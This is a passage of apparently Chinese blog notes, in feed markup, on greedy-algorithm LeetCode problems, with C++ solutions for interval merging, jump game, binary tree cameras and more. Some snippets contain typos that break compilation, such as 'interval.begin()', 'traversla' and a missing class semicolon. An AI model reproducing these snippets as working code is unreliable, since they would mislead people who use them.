&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="划分字母区间">划分字母区间</h2><p><a href="https://leetcode.cn/problems/partition-labels/">763.划分字母区间 - 力扣（Leetcode）</a></p><p>在遍历的过程中相当于是要找一个字母的边界，<strong>如果找到之前遍历过的所有字母的最远边界，说明这边界就是分割点了。</strong></p><ul><li>统计每个字符最后出现的位置</li><li>从头遍历字符，并更新字符的最远出现下标，如果找到字符最远出现位置下标和当前下标相等了，则找到了分割点</li></ul><img src="/2023/02/23/Algorithm/algorithm-10/20201222191924417.png" class="" title="763.划分字母区间"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">partitionLabels</span><span class="hljs-params">(string S)</span> </span>&#123;<br>        <span class="hljs-type">int</span> hash[<span class="hljs-number">26</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; S.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>            hash[S[i] - <span class="hljs-string">&#x27;a&#x27;</span>] = i;<br>        &#125;<br>        <br>        vector&lt;<span class="hljs-type">int</span>&gt; result;<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> right = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; S.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>            right = <span class="hljs-built_in">max</span>(right, hash[S[i] - <span class="hljs-string">&#x27;a&#x27;</span>]);<br>            <span class="hljs-keyword">if</span> (i == right) &#123;<br>                result.<span class="hljs-built_in">push_back</span>(right - left + <span class="hljs-number">1</span>);<br>                left = i + <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="合并区间">合并区间</h2><p><a href="https://leetcode.cn/problems/merge-intervals/">56. 合并区间- 力扣（Leetcode）</a></p><img src="/2023/02/23/Algorithm/algorithm-10/20201223200632791.png" class="" title="56.合并区间"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">merge</span>(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; intervals) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; result;<br>        <span class="hljs-keyword">if</span> (intervals.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> result;<br>        <span class="hljs-built_in">sort</span>(interval.<span class="hljs-built_in">begin</span>(), intervals.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; a, <span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; b)&#123;<span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>] &lt; b[<span class="hljs-number">0</span>];&#125;);<br>        <br>        result.<span class="hljs-built_in">push_back</span>(intervals[<span class="hljs-number">0</span>]);<br>        <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; intervals.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>            <span class="hljs-keyword">if</span> (result.<span class="hljs-built_in">back</span>()[<span class="hljs-number">1</span>] &gt;= intervals[i][<span class="hljs-number">0</span>]) &#123; <span class="hljs-comment">// overlap</span><br>                result.<span class="hljs-built_in">back</span>()[<span class="hljs-number">1</span>] = <span class="hljs-built_in">max</span>(result.<span class="hljs-built_in">back</span>()[<span class="hljs-number">1</span>], intervals[i][<span class="hljs-number">1</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                result.<span class="hljs-built_in">push_back</span>(intervals[i]);<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="单调递增的数字">单调递增的数字</h2><p><ahref="https://leetcode.cn/problems/monotone-increasing-digits/">738.单调递增的数字 - 力扣（Leetcode）</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">monotoneIncreasingDigits</span><span class="hljs-params">(<span class="hljs-type">int</span> N)</span> </span>&#123;<br>        string strNum = <span class="hljs-built_in">to_string</span>(N);<br>        <span class="hljs-type">int</span> flag = strNum.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = strNum.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt; <span class="hljs-number">0</span>; i --) &#123;<br>            <span class="hljs-keyword">if</span> (strNum[i - <span class="hljs-number">1</span>] &gt; strNum[i]) &#123;<br>                flag = i;<br>                strNum[i<span class="hljs-number">-1</span>] --;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = flag; i &lt; strNum.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>            strNum[i] = <span class="hljs-string">&#x27;9&#x27;</span>;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">stoi</span>(strNum);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="监控二叉树">监控二叉树</h2><blockquote><p><a href="https://leetcode.cn/problems/binary-tree-cameras/">968.监控二叉树 - 力扣（Leetcode）</a></p><p><ahref="https://programmercarl.com/0968.监控二叉树.html#思路">代码随想录(programmercarl.com)</a></p></blockquote><ul><li>0：该节点无覆盖</li><li>1：本节点有摄像头</li><li>2：本节点有覆盖</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> result;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* cur)</span> </span>&#123;<br>        <span class="hljs-comment">// 空节点，该节点有覆盖</span><br>        <span class="hljs-keyword">if</span> (cur == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>        <span class="hljs-type">int</span> left = <span class="hljs-built_in">traversla</span>(cur-&gt;left);<br>        <span class="hljs-type">int</span> right = <span class="hljs-built_in">traversal</span>(cur-&gt;right);<br>        <br>        <span class="hljs-comment">// 情况1，左右节点都有覆盖</span><br>        <span class="hljs-keyword">if</span> (left == <span class="hljs-number">2</span> &amp;&amp; right == <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <br>        <span class="hljs-comment">// 情况2</span><br>        <span class="hljs-keyword">if</span> (left == <span class="hljs-number">0</span> || right == <span class="hljs-number">0</span>) &#123;<br>            result ++;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>        <br>        <span class="hljs-comment">// 情况3</span><br>        <span class="hljs-keyword">if</span> (left == <span class="hljs-number">1</span> || right == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">minCameraCover</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        result = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// 情况4</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">traversal</span>(root) == <span class="hljs-number">0</span>) &#123;<br>            result ++;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="贪心总结">贪心总结</h2><blockquote><p><ahref="https://programmercarl.com/贪心算法总结篇.html#贪心难题">代码随想录(programmercarl.com)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>贪心算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>贪心算法(一)</title>
    <link href="/2023/01/25/Algorithm/algorithm-9/"/>
    <url>/2023/01/25/Algorithm/algorithm-9/</url>
    
    <content type="html"><![CDATA[<p>本文为学习<ahref="https://programmercarl.com/">代码随想录</a>时所做的笔记，仅供学习参考，不做任何商业用途，若有侵权，请联系删除。</p><h1 id="贪心算法一">贪心算法（一）</h1><h2 id="什么是贪心">什么是贪心</h2><p><strong>贪心的本质是选择每一阶段的局部最优解，从而达到全局最优。</strong></p><h2 id="贪心的套路什么时候用贪心">贪心的套路（什么时候用贪心）</h2><p><strong>贪心算法并没有固定的套路</strong></p><h2 id="贪心的一般解题步骤">贪心的一般解题步骤</h2><ul><li>将问题分解为若干个子问题</li><li>找出适合的贪心策略</li><li>求解每一个子问题的最优解</li><li>将局部最优解堆叠成全局最优解</li></ul><p><code>局部最优是什么，推导出全局最优</code></p><span id="more"></span><h2 id="分发饼干">分发饼干</h2><p><a href="https://leetcode.cn/problems/assign-cookies/">455. 分发饼干- 力扣（LeetCode）</a></p><h3 id="思路">思路</h3><p>这里的局部最优解就是大饼干喂给胃口大的，充分利用饼干尺寸喂饱一个，全局最优就是喂饱尽可能多的小孩</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 版本一 </span><br><span class="hljs-comment">// 时间复杂度：O(nlogn)</span><br><span class="hljs-comment">// 空间复杂度：O(1)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findContentChildren</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; g, vector&lt;<span class="hljs-type">int</span>&gt;&amp; s)</span> </span>&#123;<br>        <span class="hljs-built_in">sort</span>(g.<span class="hljs-built_in">begin</span>(), g.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-built_in">sort</span>(s.<span class="hljs-built_in">begin</span>(), s.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-type">int</span> index = s.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; <span class="hljs-comment">// 饼干数组的下标</span><br>        <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = g.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123; <span class="hljs-comment">// 遍历胃口 </span><br>            <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-number">0</span> &amp;&amp; s[index] &gt;= g[i]) &#123; <span class="hljs-comment">// 遍历饼干 </span><br>                result++;<br>                index--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="摆动序列">摆动序列</h2><p><a href="https://leetcode.cn/problems/wiggle-subsequence/">376.摆动序列 - 力扣（Leetcode）</a></p><h3 id="思路1贪心解法">思路1（贪心解法）</h3><img src="/2023/01/25/Algorithm/algorithm-9/20201124174327597.png" class="" title="376.摆动序列"><p><strong>局部最优：删除单调坡度上的节点（不包括单调坡度两端的节点），那么这个坡度就可以有两个局部峰值</strong>。</p><p><strong>整体最优：整个序列有最多的局部峰值，从而达到最长摆动序列</strong>。</p><p><strong>实际操作上，其实连删除的操作都不用做，因为题目要求的是最长摆动子序列的长度，所以只需要统计数组的峰值数量就可以了（相当于是删除单一坡度上的节点，然后统计长度）</strong></p><p><strong>这就是贪心所贪的地方，让峰值尽可能的保持峰值，然后删除单一坡度上的节点</strong></p><h3 id="情况一上下坡中有平坡">情况一：上下坡中有平坡</h3><img src="/2023/01/25/Algorithm/algorithm-9/20230106170449.png" class="" title="img"><p>如图，可以统一规则，删除左边的三个2：</p><img src="/2023/01/25/Algorithm/algorithm-9/20230106172613.png" class="" title="img"><h3 id="情况二数组首尾两端">情况二：数组首尾两端</h3><p>可以假设，数组最前面还有一个数字，那这个数字应该是什么呢？</p><p>之前我们在 讨论 情况一：相同数字连续 的时候， prediff = 0 ，curdiff&lt; 0 或者 &gt;0 也记为波谷。</p><p>那么为了规则统一，针对序列[2,5]，可以假设为[2,2,5]，这样它就有坡度了即preDiff= 0，如图：</p><img src="/2023/01/25/Algorithm/algorithm-9/20201124174357612.png" class="" title="376.摆动序列1"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 版本一</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">wiggleMaxLength</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (nums.<span class="hljs-built_in">size</span>() &lt;= <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> curDiff = <span class="hljs-number">0</span>; <span class="hljs-comment">// 当前一对差值</span><br>        <span class="hljs-type">int</span> preDiff = <span class="hljs-number">0</span>; <span class="hljs-comment">// 前一对差值</span><br>        <span class="hljs-type">int</span> result = <span class="hljs-number">1</span>;  <span class="hljs-comment">// 记录峰值个数，序列默认序列最右边有一个峰值</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i++) &#123;<br>            curDiff = nums[i + <span class="hljs-number">1</span>] - nums[i];<br>            <span class="hljs-comment">// 出现峰值</span><br>            <span class="hljs-keyword">if</span> ((preDiff &lt;= <span class="hljs-number">0</span> &amp;&amp; curDiff &gt; <span class="hljs-number">0</span>) || (preDiff &gt;= <span class="hljs-number">0</span> &amp;&amp; curDiff &lt; <span class="hljs-number">0</span>)) &#123;<br>                result++;<br>            &#125;<br>            preDiff = curDiff;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="情况三单调坡度有平坡">情况三：单调坡度有平坡</h3><img src="/2023/01/25/Algorithm/algorithm-9/20230108171505.png" class="" title="img"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 版本二 </span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">wiggleMaxLength</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (nums.<span class="hljs-built_in">size</span>() &lt;= <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> curDiff = <span class="hljs-number">0</span>; <span class="hljs-comment">// 当前一对差值</span><br>        <span class="hljs-type">int</span> preDiff = <span class="hljs-number">0</span>; <span class="hljs-comment">// 前一对差值</span><br>        <span class="hljs-type">int</span> result = <span class="hljs-number">1</span>;  <span class="hljs-comment">// 记录峰值个数，序列默认序列最右边有一个峰值</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i++) &#123;<br>            curDiff = nums[i + <span class="hljs-number">1</span>] - nums[i];<br>            <span class="hljs-comment">// 出现峰值</span><br>            <span class="hljs-keyword">if</span> ((preDiff &lt;= <span class="hljs-number">0</span> &amp;&amp; curDiff &gt; <span class="hljs-number">0</span>) || (preDiff &gt;= <span class="hljs-number">0</span> &amp;&amp; curDiff &lt; <span class="hljs-number">0</span>)) &#123;<br>                result++;<br>                preDiff = curDiff; <span class="hljs-comment">// 注意这里，只在摆动变化的时候更新prediff </span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="最大子序列">最大子序列</h2><p><a href="https://leetcode.cn/problems/maximum-subarray/">53.最大子数组和 - 力扣（Leetcode）</a></p><p><strong>局部最优：当前”连续和“为负数的时候立即放弃，从下一个元素重新计算”连续和“，因为加上负数的”连续和指挥越来越小“。</strong></p><p><strong>全局最优：选取最大”连续和“。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxSubArray</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>            <span class="hljs-type">int</span> result = INT32_MIN;<br>            <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>                count += nums[i];<br>                <span class="hljs-keyword">if</span> (count &gt; result) &#123;  <span class="hljs-comment">// 取区间累积的最大值</span><br>                    result = count;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)<br>                    count = <span class="hljs-number">0</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="买卖股票的最佳时机ii">买卖股票的最佳时机II</h2><p><ahref="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-ii/">122.买卖股票的最佳时机 II - 力扣（Leetcode）</a></p><p><strong>如果想到其实最终利润是可以分解的，那么本题就很容易了！</strong></p><p>假如第0天买入，第3天卖出，那么利润为：prices[3] - prices[0]。</p><p>相当于(prices[3] - prices[2]) + (prices[2] - prices[1]) + (prices[1]- prices[0])。</p><p><strong>此时就是把利润分解为每天为单位的维度，而不是从第0天到第3天整体去考虑！</strong></p><img src="/2023/01/25/Algorithm/algorithm-9/2020112917480858.png" class="" title="122.买卖股票的最佳时机II"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxProfit</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; prices)</span> </span>&#123;<br>            <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; prices.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>                result += <span class="hljs-built_in">max</span>(prices[i] - prices[i - <span class="hljs-number">1</span>], <span class="hljs-number">0</span>);<br>            &#125;<br>            <br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="跳跃游戏">跳跃游戏</h2><p><a href="https://leetcode.cn/problems/jump-game/">55. 跳跃游戏 -力扣（Leetcode）</a></p><p><strong>贪心算法局部最优解：每次取最大跳跃步数（取最大覆盖范围），整体最优解：最后得到整体最大覆盖范围，看是否能到终点。</strong></p><img src="/2023/01/25/Algorithm/algorithm-9/20201124154758229.png" class="" title="55.跳跃游戏"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">canJump</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br><span class="hljs-type">int</span> cover = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (nums.<span class="hljs-built_in">size</span>() == <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 只有一个元素</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= cover; i ++) &#123;<br>            cover = <span class="hljs-built_in">max</span>(i + nums[i], cover);<br>            <span class="hljs-keyword">if</span> (cover &gt;= nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="跳跃游戏ii">跳跃游戏II</h2><p><a href="https://leetcode.cn/problems/jump-game-ii/">45. 跳跃游戏 II- 力扣（Leetcode）</a></p><p><strong>要从覆盖范围出发，不管怎么跳，覆盖范围一定是可以跳到的，以最小的步数增加覆盖范围，覆盖范围一旦覆盖了终点，得到的就是最小步数。</strong></p><p><strong>需要统计两个覆盖范围，当前这一步的最大覆盖和下一步最大覆盖。</strong></p><img src="/2023/01/25/Algorithm/algorithm-9/20201201232309103.png" class="" title="45.跳跃游戏II"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// Version-1.0</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">jump</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (nums.<span class="hljs-built_in">size</span>() == <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> curDistance = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 当前覆盖最远距离下标</span><br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;  <span class="hljs-comment">//记录走的最大步数</span><br>        <span class="hljs-type">int</span> nextDistance = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 下一步覆盖最远距离下标</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i ++) &#123;<br>            nextDistance = <span class="hljs-built_in">max</span>(nums[i] + i, nextDistance);<br>            <span class="hljs-keyword">if</span> (i == curDistance) &#123;  <span class="hljs-comment">// 遇到所能覆盖的最远下标</span><br>                <span class="hljs-keyword">if</span> (curDistance &lt; nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>) &#123;  <span class="hljs-comment">// 还没有到达终点，更新覆盖距离</span><br>                    ans ++;<br>                    curDistance = nextDistance;<br>                    <span class="hljs-keyword">if</span> (curDistance &gt;= nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>)<br>                        <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// 下一步的覆盖范围已经可以到达终点</span><br>                &#125; <span class="hljs-keyword">else</span><br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="k次取反后最大化的数组和">K次取反后最大化的数组和</h2><p><ahref="https://leetcode.cn/problems/maximize-sum-of-array-after-k-negations/">1005.K 次取反后最大化的数组和 - 力扣（Leetcode）</a></p><ul><li>将数组按照绝对值大小从大到小排序</li><li>从前向后遍历，遇到负数将其变为正数，同时K--</li><li>如果K还大于0，那么反复转变数值最小的元素，将K用完</li><li>求和</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 